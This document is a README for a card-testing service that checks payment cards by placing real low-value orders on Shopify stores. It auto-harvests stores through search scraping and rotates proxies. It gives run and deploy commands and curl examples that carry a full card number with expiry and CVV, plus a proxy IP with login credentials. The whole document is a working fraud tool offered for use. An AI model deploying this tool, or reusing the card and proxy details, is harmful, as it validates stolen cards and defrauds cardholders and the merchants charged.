# CardCheckout API

Merged Shopify checkout engine. Auto-harvests $0.10–$5.00 stores
with DuckDuckGo Lite + Bing — no third-party API, no worker.

## Install

    pip install -r requirements.txt

## Run

    chmod +x start.sh
    bash start.sh
    # or
    PORT=8081 python3 api_server.py

## Endpoints

### Main — GET /

    curl "http://localhost:8081/?cc=4031630721650843|06|2029|910&proxy=196.244.48.124:12345:naveed:Qwerty_123ABC"

Auto-picks a live store. Add `&url=https://store.myshopify.com` to force one.

### POST /check

    curl -X POST http://localhost:8081/check \
      -H 'Content-Type: application/json' \
      -d '{"cc":"4031630721650843|06|2029|910","proxy":"196.244.48.124:12345:naveed:Qwerty_123ABC"}'

### Pool tools

    curl http://localhost:8081/sites
    curl http://localhost:8081/sites/stats
    curl http://localhost:8081/sites/harvest
    curl http://localhost:8081/health

### Docs

Open http://localhost:8081/docs

## Response

    {
      "Response":    "CHARGED | APPROVED | DECLINED | ERROR",
      "CC":          "4031630721650843|06|2029|910",
      "Price":       "12.34",
      "Gate":        "Shopify",
      "Site":        "https://store.myshopify.com",
      "Charged":     "True",
      "status_code": "ORDER_PLACED",
      "error":       "",
      "retryable":   false,
      "receipt_url": "https://store.myshopify.com/orders/...",
      "elapsed":     3.42
    }

## How the harvester works

Background thread runs every 15 minutes:

  1. **Discovery** — cycles through `keywords.txt`, scraping
     DuckDuckGo Lite + Bing with `site:myshopify.com <keyword>`.
  2. **Validation** — 24 parallel workers hit `/products.json` on
     each candidate. Store passes only if:
       - HTTP 200 with JSON containing `products`
       - At least one variant priced between $0.10 and $5.00 (USD)
       - Variant is not sold out
  3. **Promotion** — passing sites enter the pool, get a fresh
     `last_good` timestamp.
  4. **Revalidation** — every 24 h, pool entries are re-tested.
     Dead ones are pruned automatically.
  5. **Serving** — checks round-robin through the top-third
     healthiest sites.

Manual drop-in: add domains to `seeds.txt` — they validate on
the next cycle.

Force a cycle immediately:

    curl http://localhost:8081/sites/harvest

## Files

    api_server.py        FastAPI server (entry point)
    checkout_engine.py   Shopify checkout logic
    site_fetcher.py      harvester + pool
    keywords.txt         search keywords
    seeds.txt            manual domain drop
    requirements.txt     pip deps
    start.sh             run script
    README.md            this file
    .gitignore           runtime files to skip

## Env

| Var | Default | Purpose |
|---|---|---|
| `PORT` | `8081` | Listen port |
| `CHECKER_THREADS` | `100` | Check worker pool |
| `CHECKER_RETRIES` | `1` | Retries on retryable errors |
| `CHECKER_TIMEOUT` | `120` | Per-check hard timeout |
| `HARVEST_INTERVAL_SECS` | `900` | Harvest cycle interval |
| `HARVEST_MAX_PRICE` | `5.00` | Max product price accepted |
| `HARVEST_MIN_PRICE` | `0.10` | Min product price accepted |
| `HARVEST_PAGES_PER_KEYWORD` | `3` | Search pages per keyword |
| `HARVEST_VALIDATE_WORKERS` | `24` | Parallel validator threads |
| `HARVEST_REVALIDATE_HOURS` | `24` | Age before a site is re-checked |
| `SITE_POOL_MAX` | `800` | Max sites kept in memory |

## Deploy

    git clone https://github.com/you/repo.git
    cd repo
    pip install -r requirements.txt
    chmod +x start.sh
    bash start.sh

First run: pool warms up in 30–90 seconds. Add a few seeds to
`seeds.txt` if you want instant hits.
